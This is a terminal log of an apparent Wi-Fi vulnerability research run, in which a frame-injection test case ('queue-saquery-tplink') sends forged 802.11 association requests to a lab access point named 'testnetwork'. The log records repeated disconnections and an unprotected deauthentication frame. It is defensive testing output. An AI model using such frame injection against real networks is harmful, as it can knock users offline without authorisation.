(venv) ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
~/Desktop/wifi-vulnerabilities-analysis/queue-security-context/wifi-framework (main*) » sudo "$(which python)" ./run.py wlp0s20f3 queue-saquery-tplink     atis@atis-Latitude-5420
[18:45:49] Using interface monwlp0s20f3 (iwlwifi) to inject frames.
[18:45:49] Starting daemon using: ./dependencies/hostap_2_10/wpa_supplicant/wpa_supplicant -Dnl80211 -i wlp0s20f3 -c ./setup/supplicant.conf -W -K
Successfully initialized wpa_supplicant
wlp0s20f3: SME: Trying to authenticate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlp0s20f3: Trying to associate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlp0s20f3: Associated with c4:e9:84:af:7a:60
wlp0s20f3: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlp0s20f3: WPA: Key negotiation completed with c4:e9:84:af:7a:60 [PTK=CCMP GTK=CCMP]
wlp0s20f3: CTRL-EVENT-CONNECTED - Connection to c4:e9:84:af:7a:60 completed [id=0 id_str=]
[18:45:52] Loaded pairwise and group encryption keys.
[18:45:52] Trigger = Connected.
[18:45:52] Generating queue-saquery-tplink test case.
[18:45:53] Injected <Dot11  subtype=Association Request type=Management FCfield=pw-mgt addr1=c4:e9:84:af:7a:60 (RA=DA) addr2=ec:63:d7:89:d5:5a (TA=SA) addr3=c4:e9:84:af:7a:60 (BSSID/STA) |<Dot11AssoReq  |<Dot11Elt  ID=SSID info=b'testnetwork' |<Dot11Elt  ID=Supported Rates info=b'\x02\x04\x0b\x16\x0c\x12\x18$' |<Dot11Elt  ID=Extended Supported Rates info=b'0H`l' |<Raw  load=b'0\x1a\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x08\xc0\x00\x00\x00\x00\x0f\xac\x06' |>>>>>>
wlp0s20f3: CTRL-EVENT-DISCONNECTED bssid=c4:e9:84:af:7a:60 reason=6
wlp0s20f3: SME: Trying to authenticate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlp0s20f3: Trying to associate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlp0s20f3: Associated with c4:e9:84:af:7a:60
wlp0s20f3: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlp0s20f3: WPA: Key negotiation completed with c4:e9:84:af:7a:60 [PTK=CCMP GTK=CCMP]
wlp0s20f3: CTRL-EVENT-CONNECTED - Connection to c4:e9:84:af:7a:60 completed [id=0 id_str=]
[18:45:55] Injected <Dot11  subtype=Association Request type=Management addr1=c4:e9:84:af:7a:60 (RA=DA) addr2=ec:63:d7:89:d5:5a (TA=SA) addr3=c4:e9:84:af:7a:60 (BSSID/STA) |<Dot11AssoReq  |<Dot11Elt  ID=SSID info=b'testnetwork' |<Dot11Elt  ID=Supported Rates info=b'\x02\x04\x0b\x16\x0c\x12\x18$' |<Dot11Elt  ID=Extended Supported Rates info=b'0H`l' |<Raw  load=b'0\x1a\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x08\xc0\x00\x00\x00\x00\x0f\xac\x06' |>>>>>>
[18:45:55] 802.11 Management Deauthentication c4:e9:84:af:7a:60 (TA=SA) > ec:63:d7:89:d5:5a (RA=DA) / Dot11Deauth
[18:45:55] Detected an unprotected deauthentication frame from AP.
[18:45:55] Trigger = Received.
wlp0s20f3: CTRL-EVENT-DISCONNECTED bssid=c4:e9:84:af:7a:60 reason=6
wlp0s20f3: SME: Trying to authenticate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlp0s20f3: Trying to associate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlp0s20f3: Associated with c4:e9:84:af:7a:60
wlp0s20f3: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlp0s20f3: WPA: Key negotiation completed with c4:e9:84:af:7a:60 [PTK=CCMP GTK=CCMP]
wlp0s20f3: CTRL-EVENT-CONNECTED - Connection to c4:e9:84:af:7a:60 completed [id=0 id_str=]
[18:45:57] Disconnecting.
p2p-dev-wlp0s20: CTRL-EVENT-DSCP-POLICY clear_all
p2p-dev-wlp0s20: CTRL-EVENT-DSCP-POLICY clear_all
nl80211: deinit ifname=p2p-dev-wlp0s20 disabled_11b_rates=0
p2p-dev-wlp0s20: CTRL-EVENT-TERMINATING 
wlp0s20f3: CTRL-EVENT-DISCONNECTED bssid=c4:e9:84:af:7a:60 reason=3 locally_generated=1
[18:45:57] Closing daemon and cleaning up ...
wlp0s20f3: CTRL-EVENT-DSCP-POLICY clear_all
wlp0s20f3: CTRL-EVENT-DSCP-POLICY clear_all
nl80211: deinit ifname=wlp0s20f3 disabled_11b_rates=0
wlp0s20f3: CTRL-EVENT-TERMINATING 